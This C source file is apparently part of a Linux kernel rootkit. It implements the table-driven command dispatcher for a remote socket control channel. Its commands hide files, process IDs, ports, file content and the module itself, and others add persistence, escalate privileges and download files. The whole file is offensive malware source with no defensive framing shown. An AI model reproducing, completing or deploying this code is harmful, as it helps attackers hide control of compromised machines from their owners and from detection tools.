// SPDX-License-Identifier: GPL-2.0
//
// Command dispatch: table-driven with function pointers.
//
#include <linux/string.h>

#include "rootkit.h"

typedef int (*rk_handler_t)(struct socket *, const char *);

struct rk_cmd_entry {
	const char	*prefix;
	rk_handler_t	handler;
	bool		exact;
};

static int wrap_ping(struct socket *c, const char *a)
{
	return RK_REPLY(c, "PONG\n");
}

static int wrap_info(struct socket *c, const char *a)       { return rk_cmd_info(c); }
static int wrap_status(struct socket *c, const char *a)     { return rk_cmd_status(c); }
static int wrap_unhide_all(struct socket *c, const char *a) { return rk_cmd_unhide_all(c); }
static int wrap_hide_mod(struct socket *c, const char *a)   { return rk_cmd_hide_module(c); }
static int wrap_unhide_mod(struct socket *c, const char *a) { return rk_cmd_unhide_module(c); }
static int wrap_persist(struct socket *c, const char *a)    { return rk_cmd_persist(c); }
static int wrap_unpersist(struct socket *c, const char *a)  { return rk_cmd_unpersist(c); }
static int wrap_escalate(struct socket *c, const char *a)   { return rk_cmd_escalate(c); }

static int wrap_hide_file(struct socket *c, const char *a)
{
	return rk_cmd_hide_target(c, hidden_files, &file_count, a);
}

static int wrap_hide_pid(struct socket *c, const char *a)
{
	return rk_cmd_hide_target(c, hidden_pids, &pid_count, a);
}

static int wrap_hide_content(struct socket *c, const char *a)
{
	return rk_cmd_hide_target(c, hidden_contents, &content_count, a);
}

static int wrap_unhide_file(struct socket *c, const char *a)
{
	return rk_cmd_unhide_target(c, hidden_files, &file_count, a);
}

static int wrap_unhide_pid(struct socket *c, const char *a)
{
	return rk_cmd_unhide_target(c, hidden_pids, &pid_count, a);
}

static int wrap_unhide_content(struct socket *c, const char *a)
{
	return rk_cmd_unhide_target(c, hidden_contents, &content_count, a);
}

static const struct rk_cmd_entry cmd_table[] = {
	{ "PING",             wrap_ping,            true  },
	{ "INFO",             wrap_info,            true  },
	{ "STATUS",           wrap_status,          true  },
	{ "UNHIDE ALL",       wrap_unhide_all,      true  },
	{ "HIDE MODULE",      wrap_hide_mod,        true  },
	{ "UNHIDE MODULE",    wrap_unhide_mod,      true  },
	{ "PERSIST",          wrap_persist,          true  },
	{ "UNPERSIST",        wrap_unpersist,        true  },
	{ "ESCALATE",         wrap_escalate,         true  },
	{ "HIDE FILE ",       wrap_hide_file,        false },
	{ "HIDE PID ",        wrap_hide_pid,         false },
	{ "HIDE CONTENT ",    wrap_hide_content,     false },
	{ "HIDE PORT ",       rk_cmd_hide_port,      false },
	{ "UNHIDE FILE ",     wrap_unhide_file,      false },
	{ "UNHIDE PID ",      wrap_unhide_pid,       false },
	{ "UNHIDE CONTENT ",  wrap_unhide_content,   false },
	{ "UNHIDE PORT ",     rk_cmd_unhide_port,    false },
	{ "LIST ",            rk_cmd_list,           false },
	{ "DOWNLOAD ",        rk_cmd_download,       false },
};

int rk_dispatch(struct socket *client, char *cmd)
{
	size_t len, plen;
	int i;

	len = strlen(cmd);
	if (len > 0 && cmd[len - 1] == '\n')
		cmd[--len] = '\0';

	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
		const struct rk_cmd_entry *e = &cmd_table[i];

		plen = strlen(e->prefix);
		if (e->exact) {
			if (strcmp(cmd, e->prefix) == 0)
				return e->handler(client, NULL);
		} else if (strncmp(cmd, e->prefix, plen) == 0) {
			return e->handler(client, cmd + plen);
		}
	}

	return RK_REPLY(client, "unknown command\n");
}
